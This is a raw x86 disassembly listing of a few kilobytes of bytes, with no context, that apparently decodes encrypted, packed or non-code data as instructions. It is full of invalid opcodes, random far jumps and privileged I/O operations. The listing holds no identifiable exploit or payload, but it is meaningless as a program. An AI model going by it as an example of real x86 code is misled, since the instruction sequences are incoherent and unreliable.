  402fd5:	push   edi
  402fd6:	jg     0x402f66
  402fd8:	je     0x402fbb
  402fda:	and    dl,BYTE PTR [eax]
  402fdc:	sbb    dh,BYTE PTR [ebx]
  402fde:	nop
  402fdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fe0:	mov    ecx,0xcd8a864a
  402fe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fe6:	mov    edi,0xff0fbc08
  402feb:	daa    
  402fec:	jmp    0x9028:0xb35d0415
  402ff3:	xchg   esp,eax
  402ff4:	imul   eax,edi,0x7c
  402ff7:	mov    ds:0x25b84cff,al
  402ffc:	jmp    0xb170:0x46a0dc79
  403003:	icebp  
  403004:	add    BYTE PTR [esi],cl
  403006:	(bad)  
  403007:	outs   dx,BYTE PTR ds:[esi]
  403008:	xor    al,0xb
  40300a:	pop    eax
  40300b:	fxch   st(6)
  40300d:	mov    bh,cl
  40300f:	(bad)  [ebp+ebp*2-0x2a]
  403013:	and    al,0xc5
  403015:	and    bl,dl
  403017:	call   0x8807af70
  40301c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40301d:	iret   
  40301e:	sbb    eax,0xa8f34771
  403023:	fcomp  st(1)
  403025:	loopne 0x40303b
  403027:	mov    ah,0x6c
  403029:	clc    
  40302a:	rcl    DWORD PTR [edi],1
  40302c:	dec    edi
  40302d:	stc    
  40302e:	sar    DWORD PTR [eax+0x44],0x82
  403032:	inc    esi
  403033:	mov    eax,cs:0x467ec721
  403039:	fst    DWORD PTR [esp+eiz*4+0x743d7244]
  403040:	and    ecx,edi
  403042:	mov    eax,ds:0xc32b9888
  403047:	ss fcmovnbe st,st(1)
  40304a:	iret   
  40304b:	add    edi,DWORD PTR [edx-0x70]
  40304e:	inc    eax
  40304f:	hlt    
  403050:	cmp    cl,BYTE PTR [edx+0x3a5d35a2]
  403056:	rcl    bl,1
  403058:	jne    0x4030c9
  40305a:	push   ds
  40305b:	shl    ebx,1
  40305d:	and    ebx,edx
  40305f:	mov    ecx,0x16f1c1c5
  403064:	das    
  403065:	(bad)  
  403066:	mov    ch,0xd2
  403068:	sub    eax,0x2207f6a8
  40306d:	pop    ebp
  40306e:	jg     0x403086
  403070:	push   es
  403071:	sbb    edx,esi
  403073:	mov    al,0x72
  403075:	js     0x403046
  403077:	jo     0x4030d0
  403079:	pop    edx
  40307a:	fcmovnb st,st(0)
  40307c:	loope  0x403008
  40307e:	loope  0x403029
  403080:	and    bl,cl
  403082:	cmp    al,0x4a
  403084:	(bad)  
  403086:	call   DWORD PTR [ebx]
  403088:	pop    es
  403089:	aaa    
  40308a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40308b:	clc    
  40308c:	jnp    0x40308a
  40308e:	xchg   ebp,eax
  40308f:	and    al,0xbc
  403091:	cmp    eax,0x1bf3b81e
  403096:	sbb    DWORD PTR [ebx],0xf46dd731
  40309c:	stos   BYTE PTR es:[edi],al
  40309d:	dec    ebp
  40309e:	arpl   WORD PTR [eax],bx
  4030a0:	fcmovu st,st(2)
  4030a2:	push   esp
  4030a3:	sub    BYTE PTR [edi-0x612a6f4f],al
  4030a9:	dec    esi
  4030aa:	retf   0x7677
  4030ad:	xor    BYTE PTR [edx+0x5],0x77
  4030b1:	add    DWORD PTR [ebp+eax*1-0x6cd78592],eax
  4030b8:	je     0x4030e4
  4030ba:	mov    ds:0x9fd3459b,eax
  4030bf:	outs   dx,DWORD PTR ds:[esi]
  4030c0:	pop    esp
  4030c1:	sbb    eax,0x91562bcf
  4030c6:	cmp    eax,0xf872b34b
  4030cb:	shr    DWORD PTR [edi+0x3918ba2a],1
  4030d1:	push   ss
  4030d2:	(bad)  
  4030d3:	or     ebx,ebp
  4030d5:	mov    esi,0xc8c0cdc7
  4030da:	push   cs
  4030db:	aaa    
  4030dc:	push   esi
  4030dd:	ret    
  4030de:	imul   ecx,DWORD PTR [ecx],0x737686bf
  4030e4:	shr    BYTE PTR [esi+edi*2],1
  4030e7:	mov    ch,0x32
  4030e9:	icebp  
  4030ea:	out    0xf2,al
  4030ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030ed:	add    ebx,0xcd96c2df
  4030f3:	sub    bh,BYTE PTR [eax]
  4030f5:	cs int 0x54
  4030f8:	(bad)  
  4030f9:	test   al,0xeb
  4030fb:	stc    
  4030fc:	adc    edi,0x7fa5299a
  403102:	out    0x4a,al
  403104:	adc    edx,eax
  403106:	fdivrp st(2),st
  403108:	loop   0x403095
  40310a:	inc    ecx
  40310b:	fmul   DWORD PTR ds:0x47fe795
  403111:	pushf  
  403112:	bound  sp,DWORD PTR [eax+ebp*8-0x3d]
  403117:	add    DWORD PTR [edi-0x4d],edi
  40311a:	jle    0x40315b
  40311c:	mov    dl,0xf9
  40311e:	push   ebx
  40311f:	push   edx
  403120:	call   0x257acc59
  403125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403126:	mov    ebx,0x9d73e79d
  40312b:	mov    ecx,0x7c4aa664
  403130:	call   0x861e:0xffb65cd9
  403137:	(bad)  
  403138:	cli    
  403139:	mov    eax,0x7ecb6cd0
  40313e:	clc    
  40313f:	dec    ebp
  403140:	cmp    eax,0x73a2ed9e
  403145:	pop    eax
  403146:	xchg   bh,al
  403148:	in     al,dx
  403149:	fwait
  40314a:	cmp    ah,dh
  40314c:	popf   
  40314d:	int    0x3f
  40314f:	push   0xcfa8033e
  403154:	mov    WORD PTR [ebp+ecx*8-0x17],ds
  403158:	popa   
  403159:	loopne 0x40318b
  40315b:	add    al,bl
  40315d:	loop   0x40313d
  40315f:	mov    dl,0x51
  403161:	add    eax,0x20522900
  403166:	aaa    
  403167:	dec    eax
  403168:	add    esi,DWORD PTR [eax-0x2396b777]
  40316e:	mov    ebp,0x90b574e6
  403173:	adc    eax,0xb7405228
  403178:	mov    ebp,0xbdd77da3
  40317d:	xor    cl,ch
  40317f:	push   edi
  403180:	mov    ch,0x73
  403182:	mov    ch,0x3e
  403184:	into   
  403185:	and    eax,0x7248fd8d
  40318a:	sbb    eax,0x7fa3c20a
  40318f:	mov    dl,0xc3
  403191:	push   esi
  403192:	ins    BYTE PTR es:[edi],dx
  403193:	sar    BYTE PTR [edi],cl
  403195:	xchg   esi,eax
  403196:	or     al,0xa0
  403198:	xor    dh,BYTE PTR [eax-0x48cd90c1]
  40319e:	(bad)  
  4031a0:	add    al,0xe
  4031a2:	mov    BYTE PTR [edi+0x7b],ch
  4031a5:	hlt    
  4031a6:	xchg   BYTE PTR [ecx],cl
  4031a8:	test   al,0x70
  4031aa:	jbe    0x40312c
  4031ac:	add    eax,0xe5ff4caa
  4031b1:	fild   WORD PTR [eax]
  4031b3:	iret   
  4031b4:	and    esp,DWORD PTR [edx-0x21]
  4031b7:	(bad)  
  4031b8:	cmp    eax,0x4ba21be0
  4031bd:	daa    
  4031be:	cmp    eax,0xfaa12010
  4031c3:	ret    
  4031c4:	mov    dh,0x6a
  4031c6:	xor    dl,cl
  4031c8:	pop    es
  4031c9:	in     al,dx
  4031ca:	push   ebp
  4031cb:	mov    bh,0xe9
  4031cd:	pop    edx
  4031ce:	call   0xf6fd:0x1f0b267f
  4031d5:	pop    edi
  4031d6:	xchg   ebp,eax
  4031d7:	ja     0x40322c
  4031d9:	or     al,0xf
  4031db:	jno    0x4031da
  4031dd:	cmp    BYTE PTR [ecx],ch
  4031df:	sbb    cl,ah
  4031e1:	sahf   
  4031e2:	xor    eax,eax
  4031e4:	sahf   
  4031e5:	mov    eax,ds:0x5e815392
  4031ea:	js     0x4031b8
  4031ec:	icebp  
  4031ed:	sbb    BYTE PTR [eax],dl
  4031ef:	cmp    eax,0xc19a9562
  4031f4:	(bad)  
  4031f6:	sub    eax,0x9952d78c
  4031fb:	inc    ebx
  4031fc:	bound  ebp,QWORD PTR [ebp-0x16]
  4031ff:	enter  0x4d30,0x56
  403203:	test   ch,al
  403205:	push   ebp
  403206:	fiadd  WORD PTR [edi+0x5e]
  403209:	(bad)  
  40320a:	sbb    DWORD PTR [ebx-0x3f],esi
  40320d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40320e:	shl    eax,cl
  403210:	and    eax,0x709b55b0
  403215:	mov    ds,WORD PTR [eax]
  403217:	inc    ecx
  403218:	jb     0x4031d5
  40321a:	int    0xc2
  40321c:	sahf   
  40321d:	xchg   ebp,eax
  40321e:	dec    eax
  40321f:	xchg   edi,eax
  403220:	retf   
  403221:	xor    DWORD PTR [esi-0x1f0784f9],0xffffffdf
  403228:	loop   0x4031e7
  40322a:	adc    bl,bl
  40322c:	lods   eax,DWORD PTR ds:[esi]
  40322d:	test   al,0x65
  40322f:	out    dx,al
  403230:	pushf  
  403231:	push   esi
  403232:	and    ebp,ebp
  403234:	or     ebp,DWORD PTR [ebx-0x5b]
  403237:	call   0xc47e:0x4d548b1a
  40323e:	iret   
  40323f:	gs aas 
  403241:	push   edx
  403242:	xchg   ebx,eax
  403243:	mov    ch,0x2e
  403245:	out    dx,al
  403246:	int3   
  403247:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403248:	push   ds
  403249:	cdq    
  40324a:	xchg   esp,eax
  40324b:	rol    BYTE PTR [ecx-0x80],1
  40324e:	mov    ecx,esi
  403250:	rcr    BYTE PTR [eax-0x56d23af9],1
  403256:	xor    DWORD PTR [eax-0x6b99c7cb],ebx
  40325c:	ja     0x40323f
  40325e:	enter  0xc804,0xb1
  403262:	imul   esp,DWORD PTR [ecx+ebp*1],0xce014c65
  403269:	call   0x62d9:0x27a00fe0
  403270:	sbb    cl,al
  403272:	xor    BYTE PTR [ecx+ecx*2],bh
  403275:	add    edi,edx
  403277:	or     BYTE PTR [eax+0x4b],al
  40327a:	ins    BYTE PTR es:[edi],dx
  40327b:	addr16 add bl,bl
  40327e:	and    BYTE PTR [edi-0x60],bh
  403281:	inc    ecx
  403282:	or     BYTE PTR [esi],ah
  403284:	cs in  al,dx
  403286:	mov    ds:0xeee0a4d8,eax
  40328b:	add    BYTE PTR ds:[edx],0x3a
  40328f:	shl    BYTE PTR [esi+0x72],cl
  403292:	(bad)  
  403293:	pop    ds
  403294:	cmp    al,BYTE PTR [edx+esi*8]
  403297:	into   
  403298:	add    eax,0x19055662
  40329d:	in     al,dx
  40329e:	push   0xcf5648e7
  4032a3:	pop    edi
  4032a4:	test   edx,ecx
  4032a6:	fcomp  DWORD PTR [ebp+0x47]
  4032a9:	scas   eax,DWORD PTR es:[edi]
  4032aa:	and    bh,dl
  4032ac:	sub    cl,BYTE PTR [ebx]
  4032ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032af:	add    eax,0xad581779
  4032b4:	fst    DWORD PTR [edi+esi*2]
  4032b7:	rcl    ch,cl
  4032b9:	mov    esp,0x20b33d22
  4032be:	add    ebx,DWORD PTR [edi]
  4032c0:	jb     0x40332e
  4032c2:	fwait
  4032c3:	adc    BYTE PTR [edi],0xdc
  4032c6:	dec    edx
  4032c7:	jge    0x403252
  4032c9:	div    BYTE PTR [ecx]
  4032cb:	rcl    DWORD PTR [esi],0xbf
  4032ce:	sbb    dh,BYTE PTR ds:0xf71d24b7
  4032d4:	push   0x64
  4032d6:	cmp    DWORD PTR [ebx+0x68],0x24
  4032da:	aad    0xe
  4032dc:	sbb    eax,0x44b9ef4
  4032e1:	and    ebp,DWORD PTR [esi-0x4fe625e6]
  4032e7:	xchg   edi,eax
  4032e8:	les    ebx,FWORD PTR [ecx+0x249ee02b]
  4032ee:	shl    esp,0x56
  4032f1:	jae    0x403348
  4032f3:	cmp    BYTE PTR ds:0x330691db,al
  4032f9:	mov    al,0xe8
  4032fb:	mov    ch,0x5f
  4032fd:	push   ss
  4032fe:	or     al,0xc3
  403300:	int    0xcb
  403302:	adc    BYTE PTR [edi+0x82efb4a],ah
  403308:	scas   al,BYTE PTR es:[edi]
  403309:	jecxz  0x403297
  40330b:	test   ebp,0x27f90821
  403311:	cdq    
  403312:	xchg   edi,eax
  403313:	or     DWORD PTR [ecx-0x6b],ebp
  403316:	sub    al,0x52
  403318:	ja     0x40336a
  40331a:	push   ds
  40331b:	pop    ebp
  40331c:	mov    cl,0x9a
  40331e:	xchg   esp,eax
  40331f:	adc    al,0x66
  403321:	fist   WORD PTR [ebp+esi*1+0x40332016]
  403328:	mov    edi,0xdb3eddb0
  40332d:	pop    esp
  40332e:	dec    esi
  40332f:	adc    ebx,esp
  403331:	add    ah,BYTE PTR [esi]
  403333:	enter  0x747f,0x89
  403337:	push   ebp
  403338:	jno    0x403327
  40333a:	mov    cl,0xed
  40333c:	dec    esp
  40333d:	cld    
  40333e:	dec    ebx
  40333f:	je     0x403364
  403341:	jg     0x403340
  403343:	fnstsw WORD PTR [ebx+esi*2-0x1f]
  403347:	js     0x403397
  403349:	in     eax,dx
  40334a:	(bad)  
  40334b:	lahf   
  40334c:	sub    eax,0xb41f2944
  403351:	shl    DWORD PTR [edx],0xd3
  403354:	ss jle 0x4033c1
  403357:	pop    ecx
  403358:	or     eax,0xc7f303bd
  40335d:	fisub  WORD PTR [ebp-0x5570f813]
  403363:	push   ss
  403364:	push   eax
  403365:	xchg   esp,eax
  403366:	pop    ds
  403367:	es fwait
  403369:	int    0xe2
  40336b:	outs   dx,DWORD PTR ds:[esi]
  40336c:	mov    ds:0x37aa9cf4,eax
  403371:	mov    bl,0x1b
  403373:	shr    BYTE PTR [ebx+0x25],1
  403376:	aas    
  403377:	push   0x6de7869a
  40337c:	mov    dh,0xc4
  40337e:	ins    DWORD PTR es:[edi],dx
  40337f:	inc    eax
  403380:	mov    ebp,0x284d7d7f
  403385:	jmp    0x15e60e3e
  40338a:	gs (bad) 
  40338c:	fs es mov ecx,es
  403390:	inc    eax
  403391:	mov    eax,0xe7bde60c
  403396:	sti    
  403397:	mov    bl,0x76
  403399:	cld    
  40339a:	dec    ebp
  40339b:	btr    DWORD PTR [eax+eax*2+0x29d7c450],ebx
  4033a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033a4:	dec    ebp
  4033a5:	mov    al,dl
  4033a7:	pop    ebp
  4033a8:	fadd   QWORD PTR [esi-0x8]
  4033ab:	or     DWORD PTR [ecx],0xabb8f3c6
  4033b1:	pop    eax
  4033b2:	test   BYTE PTR [ebx],0x5c
  4033b5:	mov    ebx,0xd8b5a345
  4033ba:	jle    0x4033cd
  4033bc:	xchg   DWORD PTR [ecx-0x61],esi
  4033bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033c0:	mov    bl,0xff
  4033c2:	rcr    ah,0x95
  4033c5:	mov    al,0x69
  4033c7:	pop    ecx
  4033c8:	ja     0x4033c8
  4033ca:	sbb    ebx,ecx
  4033cc:	shl    DWORD PTR [ebp+0x74],0x6
  4033d0:	mov    eax,ds:0xa63e66d6
  4033d5:	push   ecx
  4033d6:	sub    eax,0x161b334e
  4033db:	add    ebx,DWORD PTR [edx]
  4033dd:	inc    ecx
  4033de:	mov    ah,0x83
  4033e0:	adc    al,0x9a
  4033e2:	sub    al,0xa9
  4033e4:	shl    DWORD PTR [edi],0x13
  4033e7:	out    dx,eax
  4033e8:	fnstsw WORD PTR [ebx+0x3d]
  4033eb:	inc    edi
  4033ec:	and    al,BYTE PTR [edx+0x1f186088]
  4033f2:	pop    es
  4033f3:	dec    esi
  4033f4:	call   FWORD PTR [ecx+0x5a]
  4033f7:	push   esi
  4033f8:	cmp    al,0xad
  4033fa:	mov    ah,0x74
  4033fc:	sbb    ch,BYTE PTR [esi-0x395f250]
  403402:	out    dx,al
  403403:	(bad)  
  403404:	call   0xac5a:0x4d99f76e
  40340b:	xor    ebx,DWORD PTR [esi-0x4f]
  40340e:	jae    0x403487
  403410:	ss pop ecx
  403412:	xor    ah,dl
  403414:	mov    dl,0x7d
  403416:	aam    0xb1
  403418:	and    eax,0xc59e4a99
  40341d:	in     eax,dx
  40341e:	jno    0x40348e
  403420:	jbe    0x403498
  403422:	fs in  eax,dx
  403424:	inc    ebx
  403425:	nop
  403426:	cld    
  403427:	mov    ebx,0xbb763117
  40342c:	fxch   st(2)
  40342e:	retf   0x5336
  403431:	push   eax
  403432:	add    BYTE PTR [ecx],ch
  403434:	sbb    ecx,edx
  403436:	nop
  403437:	sbb    eax,0xb12b0c06
  40343c:	popa   
  40343d:	sub    eax,0xa517f804
  403442:	and    BYTE PTR [eax+0x639a0bcf],bl
  403448:	jmp    0xf6d8:0x856ae824
  40344f:	xchg   esi,eax
  403450:	lock ja 0x403459
  403453:	leave  
  403454:	rcr    DWORD PTR [eax+0x12bff589],cl
  40345a:	or     ebx,DWORD PTR [ecx]
  40345c:	xchg   edi,eax
  40345d:	adc    ch,BYTE PTR [esi+0x74]
  403460:	in     eax,dx
  403461:	(bad)  [edi-0x2a]
  403464:	pusha  
  403465:	cdq    
  403466:	pop    ebp
  403467:	mov    bh,0x2b
  403469:	(bad)  
  40346a:	xor    al,0x4e
  40346c:	jcxz   0x4034b4
  40346f:	ins    DWORD PTR es:[edi],dx
  403470:	daa    
  403471:	xor    dh,ch
  403473:	test   ah,dl
  403475:	xor    DWORD PTR [esi+0x38],0x2b
  403479:	push   cs
  40347a:	mov    al,ds:0xdc203ad2
  40347f:	scas   eax,DWORD PTR es:[edi]
  403480:	pop    eax
  403481:	push   eax
  403482:	dec    edi
  403483:	iret   
  403484:	pop    eax
  403485:	pusha  
  403486:	fisttp QWORD PTR [edx-0x4a]
  403489:	pop    eax
  40348a:	adc    dl,BYTE PTR ds:0x35fd87f4
  403490:	xchg   ecx,eax
  403491:	mov    ax,ds:0xdfdd7508
  403497:	stos   BYTE PTR es:[edi],al
  403498:	lea    ebx,[ecx-0x36]
  40349b:	dec    edi
  40349c:	iret   
  40349d:	pop    esi
  40349e:	xor    BYTE PTR [esi+0x4b87a894],bh
  4034a4:	mov    ebp,0x400e17ab
  4034a9:	jmp    0x40346b
  4034ab:	add    eax,0x39b51fae
  4034b0:	dec    esi
  4034b1:	jle    0x403487
  4034b3:	icebp  
  4034b4:	mov    ds:0xbdf19b44,al
  4034b9:	push   cs
  4034ba:	dec    edi
  4034bb:	fld    DWORD PTR [eax]
  4034bd:	mov    bl,bl
  4034bf:	test   eax,0x204b1099
  4034c4:	stos   DWORD PTR es:[edi],eax
  4034c5:	mov    DWORD PTR [edi-0x28],esi
  4034c8:	and    eax,0x1b05a5fc
  4034cd:	cmp    bh,BYTE PTR [esi-0x3b]
  4034d0:	cli    
  4034d1:	dec    edi
  4034d2:	(bad)  
  4034d3:	mov    WORD PTR [eax+0x7e037ef6],es
  4034d9:	lds    ebx,FWORD PTR [esi+ecx*8+0x4724f576]
  4034e0:	xor    BYTE PTR [ecx-0x161ddd70],dl
  4034e6:	mov    ah,0xf5
  4034e8:	es jecxz 0x403476
  4034eb:	push   0x9d3dc097
  4034f0:	loopne 0x40349e
  4034f2:	ror    BYTE PTR [ecx],cl
  4034f4:	jp     0x4034c5
  4034f6:	jb     0x40348c
  4034f8:	ror    BYTE PTR [eax-0x3],1
  4034fb:	ss popa 
  4034fd:	mov    ah,0xa6
  4034ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403500:	xchg   ebx,eax
  403501:	imul   edi,DWORD PTR ds:0xa195cc8e,0xa36d2c45
  40350b:	xchg   edi,eax
  40350c:	hlt    
  40350d:	fbld   TBYTE PTR gs:[eax+ecx*1-0x21]
  403512:	cmp    al,BYTE PTR [ebx+0x37]
  403515:	xchg   ecx,eax
  403516:	enter  0xc146,0xbe
  40351a:	add    ebx,eax
  40351c:	xor    BYTE PTR [edi+0x37528326],ch
  403522:	mov    BYTE PTR [eax+ecx*8+0x558a9fc5],bh
  403529:	idiv   DWORD PTR [eax]
  40352b:	leave  
  40352c:	xchg   ebx,eax
  40352d:	aam    0x77
  40352f:	and    al,0x43
  403531:	push   esi
  403532:	dec    edx
  403533:	xchg   ebp,eax
  403534:	mov    al,ds:0x5868fd82
  403539:	xor    cl,BYTE PTR [edi]
  40353b:	xor    eax,0xdeb8ab27
  403540:	jecxz  0x4034c6
  403542:	stc    
  403543:	sbb    dh,0xea
  403546:	pop    ds
  403547:	daa    
  403548:	push   0x14
  40354a:	pop    esp
  40354b:	bound  ebp,QWORD PTR [ebp-0x1f00f7d5]
  403551:	push   0xffffffe5
  403553:	xchg   edx,eax
  403554:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403555:	adc    esp,esi
  403557:	jmp    0x8f53dd0b
  40355c:	pop    esi
  40355d:	add    eax,0xb9d92cf0
  403562:	inc    BYTE PTR [ecx]
  403564:	push   cs
  403565:	fimul  DWORD PTR [edi]
  403567:	xor    DWORD PTR [ecx+0x47],esp
  40356a:	ss sti 
  40356c:	int3   
  40356d:	push   esi
  40356e:	mov    ebx,0xe4ac7647
  403573:	mov    cl,0x3d
  403575:	cmp    edi,edi
  403577:	push   ss
  403578:	mov    esp,DWORD PTR [ecx]
  40357a:	(bad)  
  40357b:	adc    ebx,DWORD PTR [esi+0x2f]
  40357e:	mov    ebx,DWORD PTR [ecx+0x1d]
  403581:	in     eax,0x6f
  403583:	sbb    eax,0x1b357204
  403588:	outs   dx,BYTE PTR ds:[esi]
  403589:	pop    ebx
  40358a:	test   BYTE PTR [edx-0x78f312a8],al
  403590:	push   ecx
  403591:	and    al,0x23
  403593:	ins    BYTE PTR es:[edi],dx
  403594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403595:	push   ecx
  403596:	imul   esi,DWORD PTR [edx],0x5b
  403599:	ds push cs
  40359b:	xchg   ecx,eax
  40359c:	sbb    esp,DWORD PTR [esi]
  40359e:	pop    ds
  40359f:	adc    BYTE PTR [ecx-0x54714406],dh
  4035a5:	inc    edx
  4035a6:	push   0x36
  4035a8:	xor    al,0x1
  4035aa:	daa    
  4035ab:	push   ss
  4035ac:	aaa    
  4035ad:	sub    al,0xb6
  4035af:	inc    DWORD PTR [eax+edi*2+0x3ce5d3f3]
  4035b6:	adc    bl,BYTE PTR [ebx]
  4035b8:	jnp    0x4035eb
  4035ba:	shr    esi,1
  4035bc:	jge    0x4035ab
  4035be:	xor    ebp,ebp
  4035c0:	inc    eax
  4035c1:	mov    cl,0xc1
  4035c3:	rcr    esi,cl
  4035c5:	jo     0x4035d1
  4035c7:	mov    edx,0xd4ca62fb
  4035cc:	mov    bl,0x36
  4035ce:	mov    al,ds:0xec1ba89a
  4035d3:	rcl    BYTE PTR [edx+0x49],0xa7
  4035d7:	test   al,0x21
  4035d9:	add    ch,dl
  4035db:	dec    esp
  4035dc:	and    bh,bh
  4035de:	pop    ebp
  4035df:	adc    al,0x6
  4035e1:	ds aam 0x34
  4035e4:	jb     0x4035f1
  4035e6:	sbb    ebx,edi
  4035e8:	pop    edi
  4035e9:	add    bh,bl
  4035eb:	inc    ebp
  4035ec:	adc    al,0xbe
  4035ee:	das    
  4035ef:	out    0xfb,al
  4035f1:	sub    DWORD PTR [edx],esp
  4035f3:	int3   
  4035f4:	inc    edx
  4035f5:	lock cld 
  4035f7:	sbb    bl,BYTE PTR [ecx-0x39]
  4035fa:	xor    al,BYTE PTR [ebp-0x2d6948d]
  403600:	pop    edx
  403601:	push   esi
  403602:	(bad)  
  403603:	add    DWORD PTR [ebx-0x62],esi
  403606:	popa   
  403607:	xchg   edi,eax
  403608:	lods   al,BYTE PTR ss:[esi]
  40360a:	dec    esp
  40360b:	pop    es
  40360c:	popa   
  40360d:	pop    ebp
  40360e:	mov    bl,0x4e
  403610:	push   edx
  403611:	mov    al,0x5e
  403613:	mov    DWORD PTR [ebx+edi*1+0x78],esp
  403617:	inc    edi
  403618:	scas   eax,DWORD PTR es:[edi]
  403619:	cli    
  40361a:	mov    dl,0x7
  40361c:	das    
  40361d:	sti    
  40361e:	push   ebp
  40361f:	adc    eax,0x137ed5e6
  403624:	fisttp QWORD PTR [edi+0x21]
  403627:	jecxz  0x4035fe
  403629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40362a:	inc    eax
  40362b:	out    dx,eax
  40362c:	leave  
  40362d:	mov    dh,0xde
  40362f:	sti    
  403630:	and    al,0x90
  403632:	pushf  
  403633:	out    dx,eax
  403634:	int3   
  403635:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403636:	stos   BYTE PTR es:[edi],al
  403637:	enter  0x43cc,0xf3
  40363b:	imul   eax,DWORD PTR [edx+esi*2+0x40],0x20
  403640:	jg     0x40364e
  403642:	jl     0x403635
  403644:	hlt    
  403645:	retf   0x3a13
  403648:	dec    ebp
  403649:	jmp    0xbf331bf9
  40364e:	jo     0x4036ba
  403650:	aam    0x65
  403652:	cwde   
  403653:	in     eax,dx
  403654:	and    eax,DWORD PTR [edi]
  403656:	push   esi
  403657:	push   ebx
  403658:	or     DWORD PTR [edx-0x5c3e92d9],0xf2fcf9d2
  403662:	shr    DWORD PTR [esi-0x7441fa3b],1
  403668:	iret   
  403669:	aad    0xd9
  40366b:	push   eax
  40366c:	retf   0x7b62
  40366f:	bound  edx,QWORD PTR [ebx+0x31]
  403672:	inc    ecx
  403673:	stos   DWORD PTR es:[edi],eax
  403674:	pop    edi
  403675:	add    al,0xb9
  403677:	dec    edi
  403678:	cdq    
  403679:	je     0x403610
  40367b:	and    DWORD PTR [eax],edi
  40367d:	loope  0x403616
  40367f:	into   
  403680:	and    ch,dl
  403682:	stos   BYTE PTR es:[edi],al
  403683:	rcr    DWORD PTR [ebx],0xb3
  403686:	cld    
  403687:	push   edi
  403688:	mov    ecx,0xcbfca2a3
  40368d:	stc    
  40368e:	stos   DWORD PTR es:[edi],eax
  40368f:	adc    cl,BYTE PTR ds:0x90a59528
  403695:	and    dl,BYTE PTR [eax+0x26]
  403698:	mov    bl,0x6a
  40369a:	mov    esp,0x1d6de974
  40369f:	add    eax,0x7c13e74d
  4036a4:	jmp    0xae63:0xd0520c9c
  4036ab:	sub    al,0x8c
  4036ad:	jno    0x403672
  4036af:	pop    ss
  4036b0:	test   edx,edi
  4036b2:	fwait
  4036b3:	inc    ecx
  4036b4:	mov    ?,edx
  4036b6:	lds    esp,FWORD PTR [esi-0x651182f]
  4036bc:	pop    ds
  4036bd:	repz add eax,0x85fa769e
  4036c3:	mov    esi,0xa062b829
  4036c8:	loopne 0x403683
  4036ca:	sub    al,0x61
  4036cc:	add    al,0x32
  4036ce:	in     al,0xbb
  4036d0:	xchg   ecx,eax
  4036d1:	xor    edi,DWORD PTR [ebx-0x80]
  4036d4:	push   0x7e
  4036d6:	adc    BYTE PTR [eax+0x5c],ch
  4036d9:	hlt    
  4036da:	fcom   st(7)
  4036dc:	cmp    eax,0x52e86994
  4036e1:	data16 and al,0xfd
  4036e4:	aaa    
  4036e5:	lea    ebp,[eax]
  4036e7:	rcr    BYTE PTR [ecx-0x2b],cl
  4036ea:	mov    BYTE PTR [ebx+0x66],bl
  4036ed:	pop    ebp
  4036ee:	imul   esp,DWORD PTR [ecx],0xffffffb6
  4036f1:	arpl   WORD PTR [edx],cx
  4036f3:	aaa    
  4036f4:	bnd jbe 0x4036ab
  4036f7:	push   ss
  4036f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036f9:	jmp    0xad27:0x368892d9
  403700:	ins    DWORD PTR es:[edi],dx
  403701:	lods   al,BYTE PTR ds:[esi]
  403702:	jno    0x403746
  403704:	fwait
  403705:	lds    ebp,FWORD PTR [edi-0x3efb1406]
  40370b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40370c:	mov    al,ds:0x9cfc0a7c
  403711:	mov    edi,0x28910c44
  403716:	lahf   
  403717:	cmp    eax,0xdc1ef37b
  40371c:	fld    QWORD PTR fs:[ebx+0x68]
  403720:	push   0xb7d8512c
  403725:	(bad)  
  403726:	fsubr  DWORD PTR [eax-0x53]
  403729:	or     eax,0x13f6337d
  40372e:	push   ebp
  40372f:	dec    edx
  403730:	dec    ebx
  403731:	adc    ch,0x17
  403734:	sbb    eax,0x531b02d7
  403739:	jae    0x403718
  40373b:	stos   DWORD PTR es:[edi],eax
  40373c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40373d:	call   0xd02c109c
  403742:	sub    BYTE PTR [eax],al
  403744:	dec    eax
  403745:	mov    ds:0x8afac92,eax
  40374a:	bnd je 0x403731
  40374d:	mov    edx,0xf78e0433
  403752:	test   eax,0xa9f22ba4
  403757:	mov    eax,fs:0x435ea19f
  40375d:	pop    ebp
  40375e:	pop    esi
  40375f:	les    esp,FWORD PTR [ecx-0x19]
  403762:	jmp    0x1f4b:0x6783a888
  403769:	mov    ds,WORD PTR [ebx-0x4efd5974]
  40376f:	cmp    DWORD PTR [edi-0x26],ebx
  403772:	mov    cl,al
  403774:	in     eax,dx
  403775:	ins    DWORD PTR es:[edi],dx
  403776:	push   0x33
  403778:	cli    
  403779:	mov    cl,BYTE PTR [esi]
  40377b:	mov    ecx,0x67dcf64a
  403780:	mov    dl,0x64
  403782:	xor    al,0x6c
  403784:	xlat   BYTE PTR ds:[ebx]
  403785:	inc    esi
  403786:	(bad)  
  403787:	sub    dh,ch
  403789:	and    DWORD PTR [eax+0x7c],esi
  40378c:	stc    
  40378d:	lahf   
  40378e:	add    al,0x87
  403790:	or     eax,0x3b254bb7
  403795:	shl    DWORD PTR [ebx+0x1d35ba6d],cl
  40379b:	sub    ecx,DWORD PTR [eax]
  40379d:	sbb    al,0x71
  40379f:	popf   
  4037a0:	mov    bl,0x4e
  4037a2:	and    DWORD PTR ds:0x407ce145,ebx
  4037a8:	pop    ss
  4037a9:	or     al,BYTE PTR [edx+0x111e5e9f]
  4037af:	shl    al,cl
  4037b1:	mov    eax,ds:0x6c4abab3
